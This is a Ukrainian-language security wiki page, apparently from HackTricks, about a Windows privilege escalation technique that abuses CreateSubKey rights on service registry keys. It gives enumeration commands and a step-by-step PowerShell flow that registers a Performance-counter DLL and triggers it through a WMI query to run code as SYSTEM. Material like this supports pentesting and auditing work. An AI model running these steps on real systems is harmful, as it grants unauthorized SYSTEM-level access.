# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Оригінальний пост**: [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

Якщо у вас є лише **`Create Subkey`** / **`AppendData/AddSubdirectory`** на registry key сервісу, це все одно хороший шлях до privesc. Зазвичай ви **не можете** напряму перезаписати `ImagePath`, `ServiceDll` або інші існуючі значення, але все ще можете створити дочірній ключ **`Performance`** під:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Будь-яким іншим ключем **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, де ваш token має **`KEY_CREATE_SUB_KEY`**

Фокус у тому, що Windows досі підтримує застарілу модель реєстрації **PerfLib V1**. Якщо у сервісу є підключ **`Performance`**, Windows може завантажити звідти DLL, коли споживач performance counter запитує дані.

Згідно з документацією Microsoft, мінімальна реєстрація така:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Отже, практичний висновок такий: **не відкидайте знайдену службу в registry лише тому, що ви отримали `CreateSubKey`, а не `SetValue`**.

## Чому цього достатньо для code execution

Підключ `Performance` зазвичай **не існує** за замовчуванням у цих services, тож вам потрібен саме примітив **`KEY_CREATE_SUB_KEY`**. Коли key створено і він містить `Library`/`Open`/`Collect`/`Close`, будь-який **performance counter consumer** може спровокувати завантаження DLL.

Кілька важливих деталей:

- Значення **`Library`** може вказувати на **повний шлях до DLL**.
- DLL повинна експортувати **`OpenPerfData`**, **`CollectPerfData`** і **`ClosePerfData`** та повертати `ERROR_SUCCESS`.
- Код виконується в **context споживача**, **не обов’язково в самому вразливому service process**.
- У класичному випадку **`RpcEptMapper`** / **`Dnscache`**, **WMI performance query** може змусити **`wmiprvse.exe`** завантажити DLL як **`NT AUTHORITY\SYSTEM`**.

Саме тому цей primitive легко пропустити під час triage: parent service key не є "fully writable", але його все одно можна використати як weaponizable.

## Швидка enumeration

Ручна перевірка за допомогою **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Приклад PowerShell для пошуку низькопривілейованих principals з **`CreateSubKey`** на service keys:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Корисні інструменти:

- **PrivescCheck**: `Get-ModifiableRegistryPath` був створений спеціально, щоб виявляти цей клас проблем.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: автоматизує DLL drop, реєстрацію `Performance`, WMI trigger, token duplication і cleanup на legacy вразливих цілях (наприклад: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Створіть підключ `Performance` і заповніть необхідні значення:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Потім запустіть **privileged** consumer продуктивності. Класичний приклад — WMI-запит до класів `Win32_Perf*`:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operational notes:

- Запуск **`perfmon.exe`** корисний, щоб перевірити, що реєстрація лічильника коректна, але зазвичай це лише завантажує DLL у **власному user context**.
- Для реального LPE запускайте **privileged** consumer, такий як **WMI**.
- Якщо ви пишете власний exploit, прямий запуск `cmd.exe` ізсередини DLL зазвичай залишає вас із shell у **session 0**. `Perfusion` вирішує це шляхом дублювання privileged token у процес, який був створений suspended у session атакера.
- Узгоджуйте архітектуру DLL із цільовим consumer (**x64 на x64 системах**).

## Version notes / recent developments

Історично вбудованими weak keys були:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` і `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` зазначає, що оновлення **April 2021** прибрали простий шлях exploitation на оновлених **Windows 8 / Windows Server 2012**, тоді як **Windows 7 / Windows Server 2008 R2** залишалися exploitable через **`Dnscache`**.

Ця primitive — **не лише historical**. У **January 2025**, Microsoft виправила пов’язану проблему AD DS, де члени **`Network Configuration Operators`** могли створювати subkeys під **`Dnscache`** і **`NetBT`**, а ту саму ідею **Performance-counter DLL registration** можна було повторно використати, щоб отримати **SYSTEM** на підтримуваних системах.

Отже, сучасний урок загальний: щоразу, коли low-privileged principal має **`CreateSubKey`** на **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, перевіряйте, чи достатньо дочірнього ключа **`Performance`** перед тим, як відкидати finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
